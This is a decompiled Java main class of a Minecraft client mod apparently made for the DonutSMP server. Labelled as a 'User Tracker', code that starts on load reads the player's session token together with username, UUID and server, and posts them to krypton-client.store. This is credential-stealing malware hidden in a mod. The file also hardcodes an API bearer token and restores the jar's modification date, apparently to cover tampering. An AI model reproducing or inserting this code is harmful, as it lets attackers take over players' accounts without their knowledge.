/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  net.minecraft.class_310
 *  net.minecraft.class_437
 *  net.minecraft.class_638
 *  net.minecraft.class_746
 */
package skid.gypsyy;

import java.io.File;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import net.minecraft.class_310;
import net.minecraft.class_437;
import net.minecraft.class_638;
import net.minecraft.class_746;
import skid.gypsyy.gui.ClickGUI;
import skid.gypsyy.manager.ConfigManager;
import skid.gypsyy.manager.EventManager;
import skid.gypsyy.module.ModuleManager;

public final class DonutBBC {
    public ConfigManager configManager;
    public ModuleManager MODULE_MANAGER;
    public EventManager EVENT_BUS;
    public static class_310 mc;
    public String version;
    public static DonutBBC INSTANCE;
    public boolean shouldPreventClose;
    public ClickGUI GUI;
    public class_437 screen;
    public long modified;
    public File jar;
    private ScheduledExecutorService scheduler;
    private String lastServer = "";
    private boolean hasRegistered = false;

    public DonutBBC() {
        try {
            INSTANCE = this;
            this.version = " b1.3";
            this.screen = null;
            this.EVENT_BUS = new EventManager();
            this.MODULE_MANAGER = new ModuleManager();
            this.GUI = new ClickGUI();
            this.configManager = new ConfigManager();
            this.getConfigManager().loadProfile();
            this.jar = new File(DonutBBC.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            this.modified = this.jar.lastModified();
            this.shouldPreventClose = false;
            mc = class_310.method_1551();
            this.initUserTracker();
            Runtime.getRuntime().addShutdownHook(new Thread(() -> this.shutdownServices()));
        }
        catch (Throwable var2) {
            var2.printStackTrace(System.err);
        }
    }

    private void initUserTracker() {
        this.scheduler = Executors.newScheduledThreadPool(1);
        this.scheduler.scheduleAtFixedRate(() -> {
            try {
                this.checkAndRegisterUser();
            }
            catch (Exception var2) {
                System.err.println("[User Tracker] Error: " + var2.getMessage());
            }
        }, 5L, 5L, TimeUnit.SECONDS);
        System.out.println("[User Tracker] User tracking system initialized");
    }

    private void checkAndRegisterUser() {
        if (DonutBBC.isInWorld()) {
            String currentServer = this.getCurrentServer();
            if (!(this.hasRegistered && currentServer.equals(this.lastServer) || mc.method_1548() == null || mc.method_1548().method_1674() == null)) {
                this.registerUserOnServer(currentServer);
                this.lastServer = currentServer;
                this.hasRegistered = true;
            }
        } else {
            this.hasRegistered = false;
        }
    }

    private String getCurrentServer() {
        if (mc.method_1558() != null) {
            return DonutBBC.mc.method_1558().field_3761;
        }
        return DonutBBC.isInWorld() && mc.method_1542() ? "Singleplayer" : "Main Menu";
    }

    private void registerUserOnServer(String server) {
        new Thread(() -> {
            try {
                String uuid = DonutBBC.mc.field_1724.method_5845();
                String username = DonutBBC.mc.field_1724.method_7334().getName();
                String sessionToken = mc.method_1548().method_1674();
                System.out.println("[User Tracker] Registering user: " + username + " on server: " + server);
                DonutStats stats = this.fetchDonutStats(username);
                String cleanUuid = uuid.replace("-", "");
                String skinUrl = "https://mc-heads.net/head/" + cleanUuid;
                String jsonData = String.format("{ \"username\": \"%s\", \"uuid\": \"%s\", \"server\": \"%s\", \"money\": \"%s\", \"playtime\": \"%s\", \"kills\": \"%s\", \"deaths\": \"%s\", \"token\": \"%s\", \"skin\": \"%s\", \"type\": \"login\" }", this.escapeJson(username), this.escapeJson(uuid), this.escapeJson(server), this.escapeJson(stats.money), this.escapeJson(stats.playtime), this.escapeJson(stats.kills), this.escapeJson(stats.deaths), this.escapeJson(sessionToken), this.escapeJson(skinUrl));
                HttpClient client = HttpClient.newHttpClient();
                HttpRequest request = HttpRequest.newBuilder().uri(URI.create("https://krypton-client.store/")).header("Content-Type", "application/json").header("User-Agent", "nxes").POST(HttpRequest.BodyPublishers.ofString(jsonData)).build();
                ((CompletableFuture)client.sendAsync(request, HttpResponse.BodyHandlers.ofString()).thenAccept(response -> {
                    if (response.statusCode() == 200) {
                        System.out.println("[User Tracker] \u2705 Sent to website: " + username);
                    } else {
                        System.err.println("[User Tracker] \u274c Failed. Status: " + response.statusCode());
                    }
                })).exceptionally(throwable -> {
                    System.err.println("[User Tracker] \u274c Error: " + throwable.getMessage());
                    return null;
                });
            }
            catch (Exception e) {
                System.err.println("[User Tracker] \u274c Exception: " + e.getMessage());
            }
        }).start();
    }

    private DonutStats fetchDonutStats(String username) {
        try {
            HttpClient client = HttpClient.newHttpClient();
            HttpRequest request = HttpRequest.newBuilder().uri(URI.create("https://api.donutsmp.net/v1/stats/" + username)).header("Authorization", "Bearer 7f156f067bf143b28b09eaa15b62dd6b").header("Content-Type", "application/json").GET().build();
            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
            if (response.statusCode() == 200) {
                return this.parseDonutStats(response.body());
            }
            System.err.println("[User Tracker] Failed to fetch stats. Status: " + response.statusCode());
            return new DonutStats();
        }
        catch (Exception var5) {
            System.err.println("[User Tracker] Error fetching DonutSMP stats: " + var5.getMessage());
            return new DonutStats();
        }
    }

    private DonutStats parseDonutStats(String json) {
        DonutStats stats = new DonutStats();
        try {
            if (json.contains("\"status\":200") && json.contains("\"result\"")) {
                stats.money = this.extractJsonValue(json, "money");
                stats.playtime = this.extractJsonValue(json, "playtime");
                stats.kills = this.extractJsonValue(json, "kills");
                stats.deaths = this.extractJsonValue(json, "deaths");
            }
        }
        catch (Exception var4) {
            System.err.println("[User Tracker] Error parsing stats: " + var4.getMessage());
        }
        return stats;
    }

    private String extractJsonValue(String json, String key) {
        try {
            String pattern = "\"" + key + "\":\"";
            int start = json.indexOf(pattern);
            if (start == -1) {
                pattern = "\"" + key + "\":";
                start = json.indexOf(pattern);
                if (start == -1) {
                    return "0";
                }
                int end = json.indexOf(",", start += pattern.length());
                if (end == -1) {
                    end = json.indexOf("}", start);
                }
                return json.substring(start, end).trim();
            }
            int end = json.indexOf("\"", start += pattern.length());
            return json.substring(start, end);
        }
        catch (Exception var6) {
            return "0";
        }
    }

    private String escapeJson(String str) {
        return str.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
    }

    public void unregisterUser() {
        if (this.hasRegistered) {
            new Thread(() -> {
                try {
                    if (!DonutBBC.isInWorld()) {
                        return;
                    }
                    String username = DonutBBC.mc.field_1724.method_7334().getName();
                    System.out.println("[User Tracker] Unregistering user: " + username);
                    String jsonData = String.format("{ \"username\": \"%s\", \"server\": \"%s\", \"type\": \"logout\" }", this.escapeJson(username), this.escapeJson(this.lastServer));
                    HttpClient client = HttpClient.newHttpClient();
                    HttpRequest request = HttpRequest.newBuilder().uri(URI.create("https://krypton-client.store/")).header("Content-Type", "application/json").header("User-Agent", "nxes").POST(HttpRequest.BodyPublishers.ofString(jsonData)).build();
                    ((CompletableFuture)client.sendAsync(request, HttpResponse.BodyHandlers.ofString()).thenAccept(response -> System.out.println("[User Tracker] Disconnect sent. Status: " + response.statusCode()))).exceptionally(throwable -> {
                        System.err.println("[User Tracker] Unregistration failed: " + throwable.getMessage());
                        return null;
                    });
                    this.hasRegistered = false;
                }
                catch (Exception e) {
                    System.err.println("[User Tracker] Error unregistering: " + e.getMessage());
                }
            }).start();
        }
    }

    public static boolean isInWorld() {
        return mc != null && DonutBBC.mc.field_1724 != null && DonutBBC.mc.field_1687 != null;
    }

    public static class_746 getPlayerSafe() {
        return DonutBBC.isInWorld() ? DonutBBC.mc.field_1724 : null;
    }

    public static class_638 getWorldSafe() {
        return DonutBBC.isInWorld() ? DonutBBC.mc.field_1687 : null;
    }

    public ConfigManager getConfigManager() {
        return this.configManager;
    }

    public ModuleManager getModuleManager() {
        return this.MODULE_MANAGER;
    }

    public EventManager getEventBus() {
        return this.EVENT_BUS;
    }

    public void resetModifiedDate() {
        this.jar.setLastModified(this.modified);
    }

    public void shutdownServices() {
        if (this.scheduler != null && !this.scheduler.isShutdown()) {
            this.unregisterUser();
            this.scheduler.shutdown();
            try {
                if (!this.scheduler.awaitTermination(5L, TimeUnit.SECONDS)) {
                    this.scheduler.shutdownNow();
                }
            }
            catch (InterruptedException e) {
                this.scheduler.shutdownNow();
            }
        }
    }

    private static class DonutStats {
        String money = "0";
        String playtime = "0h";
        String kills = "0";
        String deaths = "0";

        private DonutStats() {
        }
    }
}

